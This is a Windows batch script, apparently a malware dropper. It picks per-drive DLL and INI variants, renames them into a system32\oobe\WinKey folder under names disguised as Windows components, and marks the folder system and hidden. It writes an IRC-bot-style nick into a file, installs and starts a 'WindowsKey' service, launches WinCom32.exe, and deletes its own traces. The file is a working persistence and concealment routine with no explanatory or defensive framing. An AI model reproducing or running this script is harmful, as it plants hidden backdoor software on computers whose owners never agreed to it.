   @echo off
   :todel
   del "D:\Uploads\WinDNS.exe"
   IF EXIST "D:\Uploads\WinDNS.exe" GOTO todel
   @echo off
   SET MXHOME=%WINDIR%\system32
   SET MXBIN=%WINDIR%\system32
   if exist %WINDIR%\system32\oobe\WinKey\Mslogin.dll goto END
   if exist %WINDIR%\system32\lss.ini goto END

   cd %WINDIR%\system32
   if %WINDIR% == C:\WINNT goto WINNTC
   if %WINDIR% == D:\WINNT goto WINNTD
   if %WINDIR% == E:\WINNT goto WINNTE
   if %WINDIR% == C:\WINDOWS goto WINDOWSC
   if %WINDIR% == D:\WINDOWS goto WINDOWSD
   if %WINDIR% == E:\WINDOWS goto WINDOWSE
   goto END

   :WINNTC
   ren %WINDIR%\system32\oobe\WinKey\WinAudio.ntc.ini WinAudio.ini
   ren %WINDIR%\system32\oobe\WinKey\WinKey.ntc.dll WinKey.dll
   ren %WINDIR%\system32\oobe\WinKey\MSlogin.ntc.dll MSlogin.dll
   del %WINDIR%\system32\oobe\WinKey\WinAudio.ntd.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.nte.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.winc.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.wind.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.wine.ini
   del %WINDIR%\system32\oobe\WinKey\WinKey.ntd.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.nte.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.winc.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.wind.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.wine.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.ntd.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.nte.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.winc.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.wind.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.wine.dll
   goto DONE

   :WINNTD
   ren %WINDIR%\system32\oobe\WinKey\WinAudio.ntd.ini WinAudio.ini
   ren %WINDIR%\system32\oobe\WinKey\WinKey.ntd.dll WinKey.dll
   ren %WINDIR%\system32\oobe\WinKey\MSlogin.ntd.dll MSlogin.dll
   del %WINDIR%\system32\oobe\WinKey\WinAudio.ntc.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.nte.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.winc.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.wind.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.wine.ini
   del %WINDIR%\system32\oobe\WinKey\WinKey.ntc.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.nte.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.winc.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.wind.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.wine.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.ntc.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.nte.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.winc.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.wind.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.wine.dll
   goto DONE

   :WINNTE
   ren %WINDIR%\system32\oobe\WinKey\WinAudio.nte.ini WinAudio.ini
   ren %WINDIR%\system32\oobe\WinKey\WinKey.nte.dll WinKey.dll
   ren %WINDIR%\system32\oobe\WinKey\MSlogin.nte.dll MSlogin.dll
   del %WINDIR%\system32\oobe\WinKey\WinAudio.ntc.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.ntd.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.winc.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.wind.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.wine.ini
   del %WINDIR%\system32\oobe\WinKey\WinKey.ntc.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.ntd.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.winc.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.wind.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.wine.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.ntc.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.ntd.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.winc.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.wind.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.wine.dll
   goto DONE

   :WINDOWSC
   ren %WINDIR%\system32\oobe\WinKey\WinAudio.winc.ini WinAudio.ini
   ren %WINDIR%\system32\oobe\WinKey\WinKey.winc.dll WinKey.dll
   ren %WINDIR%\system32\oobe\WinKey\MSlogin.winc.dll MSlogin.dll
   del %WINDIR%\system32\oobe\WinKey\WinAudio.ntc.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.ntd.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.nte.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.wind.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.wine.ini
   del %WINDIR%\system32\oobe\WinKey\WinKey.ntc.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.ntd.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.nte.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.wind.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.wine.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.ntc.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.ntd.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.nte.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.wind.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.wine.dll
   goto DONE

   :WINDOWSD
   ren %WINDIR%\system32\oobe\WinKey\WinAudio.wind.ini WinAudio.ini
   ren %WINDIR%\system32\oobe\WinKey\WinKey.wind.dll WinKey.dll
   ren %WINDIR%\system32\oobe\WinKey\MSlogin.wind.dll MSlogin.dll
   del %WINDIR%\system32\oobe\WinKey\WinAudio.ntc.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.ntd.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.nte.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.winc.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.wine.ini
   del %WINDIR%\system32\oobe\WinKey\WinKey.ntc.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.ntd.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.nte.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.winc.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.wine.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.ntc.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.ntd.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.nte.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.winc.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.wine.dll
   goto DONE

   :WINDOWSE
   ren %WINDIR%\system32\oobe\WinKey\WinAudio.wine.ini WinAudio.ini
   ren %WINDIR%\system32\oobe\WinKey\WinKey.wine.dll WinKey.dll
   ren %WINDIR%\system32\oobe\WinKey\MSlogin.wine.dll MSlogin.dll
   del %WINDIR%\system32\oobe\WinKey\WinAudio.ntc.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.ntd.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.nte.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.wind.ini
   del %WINDIR%\system32\oobe\WinKey\WinAudio.winc.ini
   del %WINDIR%\system32\oobe\WinKey\WinKey.ntc.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.ntd.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.nte.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.wind.dll
   del %WINDIR%\system32\oobe\WinKey\WinKey.winc.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.ntc.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.ntd.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.nte.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.wind.dll
   del %WINDIR%\system32\oobe\WinKey\MSlogin.winc.dll
   goto DONE

   :DONE
   attrib +S +H %WINDIR%\system32\oobe\WinKey
   attrib +S +H %WINDIR%\system32\oobe\WinKey\* /S
   attrib +S +H %WINDIR%\system32\oobe\WinKey\dll
   attrib +S +H %WINDIR%\system32\oobe\WinKey\dll\* /S
   echo user_nick [iNF]-SNY2-%RANDOM%>>%WINDIR%\system32\oobe\WinKey\MSlogin.dll
   %WINDIR%\system32\oobe\WinKey\WinAudio.exe -i
   net start "WindowsKey"
   %WINDIR%\system32\oobe\WinKey\WinCom32.exe

   :END
   exit
   del "D:\Temp\~systmp.bat"
